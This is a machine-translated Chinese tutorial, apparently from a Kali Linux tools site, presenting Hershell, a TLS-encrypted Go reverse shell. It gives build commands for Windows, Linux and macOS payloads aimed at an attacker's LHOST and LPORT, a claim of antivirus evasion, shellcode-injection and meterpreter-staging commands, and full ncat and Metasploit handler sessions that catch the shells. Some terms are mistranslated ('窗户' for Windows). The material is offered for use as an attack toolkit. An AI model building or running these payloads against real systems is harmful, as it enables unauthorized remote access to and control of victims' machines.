# her Shell——简单的 TCP 反向外壳，可以在多个系统上工作

> 原文：<https://kalilinuxtutorials.com/hershell-simple-tcp-reverse-shell/>

Hershell 是一个简单的用 [Go](https://golang.org) 编写的 TCP 反向 shell。它使用 TLS 来保护通信，并提供证书公钥指纹锁定功能，防止流量拦截。

支持的操作系统有:

*   **窗户**
*   **Linux**
*   **苹果操作系统**
*   **FreeBSD 和衍生品**

虽然 meterpreter 的有效载荷很大，但它们有时会被 AV 产品发现。因为它是用 Go 编写的，所以您可以针对所需的架构交叉编译源代码。

## **赫谢尔要求**

由于这是一个 Go 项目，您将需要遵循[官方文档](https://golang.org/doc/install)来设置您的 Golang 环境(使用 **`$GOPATH`** 环境变量)。

然后，只需运行 **`go get github.com/sysdream/hershell`** 来获取项目。

### **制造有效载荷**

为了简化，您可以使用提供的 Makefile。您可以设置以下环境变量:

*   `**GOOS**`:目标操作系统
*   `**GOARCH**`:目标架构
*   `**LHOST**`:攻击者的 IP 或域名
*   `**LPORT**`:监听端口

对于`**GOOS**`和`**GOARCH**`变量，可以在这里得到允许值[。](https://golang.org/doc/install/source#environment)

然而，`**Makefile**`中提供了一些辅助目标:

*   `**depends**`:生成服务器证书(反向 shell 需要)
*   `**windows32**`:构建一个 windows 32 位可执行文件(PE 32 位)
*   `**windows64**`:构建一个 windows 64 位可执行文件(PE 64 位)
*   `**linux32**`:构建一个 linux 32 位可执行文件(ELF 32 位)
*   `**linux64**`:构建一个 linux 64 位可执行文件(ELF 64 位)
*   `**macos32**`:构建一个 mac os 32 位可执行文件(Mach-O)
*   `**macos64**`:构建一个 mac os 64 位可执行文件(Mach-O)

对于那些目标，你只需要设置`**LHOST**`和 **`LPORT`** 环境变量。

**也可理解为[Firework——与微软工作区交互创建有效文件的工具](https://kalilinuxtutorials.com/firework-tool-interact-microsoft-workplaces/)**

### **使用外壳**

一旦执行，您将获得一个远程外壳。这个定制的交互式 shell 将允许您通过 Windows 上的`cmd.exe`或 UNIX 机器上的`/bin/sh`来执行系统命令。

支持以下特殊命令:

*   给你一个系统外壳(例如，允许你改变目录)
*   `**inject <base64 shellcode>**`:在同一个进程内存中注入一个 shellcode (base64 编码)，并执行它(目前仅限 Windows)。
*   `**meterpreter [tcp|http|https] IP:PORT**`:连接 multi/handler 从 metasploit 获取 stage2 reverse tcp、http 或 https meterpreter，并执行内存中的 shellcode(目前仅限 Windows)
*   `**exit**`:优雅地退出

## **Hershell 用法**

首先，您需要生成一个有效的证书:

```
$ make depends
openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
Generating a 4096 bit RSA private key
....................................................................................++
.....++
writing new private key to 'server.key'
-----
cat server.key >> server.pem
```

##### **对于 windows:**

```
# Predifined 32 bit target
$ make windows32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make windows64 LHOST=192.168.0.12 LPORT=1234
```

##### **对于 Linux:**

```
# Predifined 32 bit target
$ make linux32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make linux64 LHOST=192.168.0.12 LPORT=1234
```

##### **苹果 OS X**

```
$ make macos LHOST=192.168.0.12 LPORT=1234
```

## **例题**

### **基本用法**

可以使用各种工具来处理输入连接，例如:

*   socat
*   ncat
*   openssl 服务器模块
*   metasploit 多重处理程序(带有一个`**python/shell_reverse_tcp_ssl**`有效负载)

下面是一个关于`ncat`的例子:

```
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 172.16.122.105.
Ncat: Connection from 172.16.122.105:47814.
[hershell]> whoami
desktop-3pvv31a\lab
```

### **抄表员暂存**

**警告**:这目前只适用于 Windows 平台。

meterpreter staging 目前支持以下有效载荷:

*   `**windows/meterpreter/reverse_tcp**`
*   **`windows/x64/meterpreter/reverse_tcp`**
*   T2`**windows/meterpreter/reverse_http**`
*   T2`**windows/x64/meterpreter/reverse_http**`
*   **`windows/meterpreter/reverse_https`**
*   **`windows/x64/meterpreter/reverse_https`**

要使用正确的协议，只需指定想要使用的传输协议(tcp、http、https)

要使用 meterpreter 暂存功能，只需启动您的处理程序:

```
[14:12:45][172.16.122.105][Sessions: 0][Jobs: 0] > use exploit/multi/handler
[14:12:57][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
[14:13:12][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lhost 172.16.122.105
lhost => 172.16.122.105
[14:13:15][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lport 8443
lport => 8443
[14:13:17][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set HandlerSSLCert ./server.pem
HandlerSSLCert => ./server.pem
[14:13:26][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.

[*] [2018.01.29-14:13:29] Started HTTPS reverse handler on https://172.16.122.105:8443
[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
```

然后，在 **`hershell`** 中，使用`**meterpreter**`命令:

```
[hershell]> meterpreter https 172.16.122.105:8443
```

新的抄表员会话应弹出`**msfconsole**`:

```
[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
[*] [2018.01.29-14:16:44] https://172.16.122.105:8443 handling request from 172.16.122.105; (UUID: pqzl9t5k) Staging x64 payload (206937 bytes) ...
[*] Meterpreter session 1 opened (172.16.122.105:8443 -> 172.16.122.105:44804) at 2018-01-29 14:16:44 +0100

[14:16:46][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x64/windows  DESKTOP-3PVV31A\lab @ DESKTOP-3PVV31A  172.16.122.105:8443 -> 172.16.122.105:44804 (10.0.2.15)

[14:16:48][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-3PVV31A\lab
```

[![](img/d861a9096555aeb1980fc054015933d7.png) ](https://github.com/sysdream/hershell) **鸣谢:罗南·克韦拉**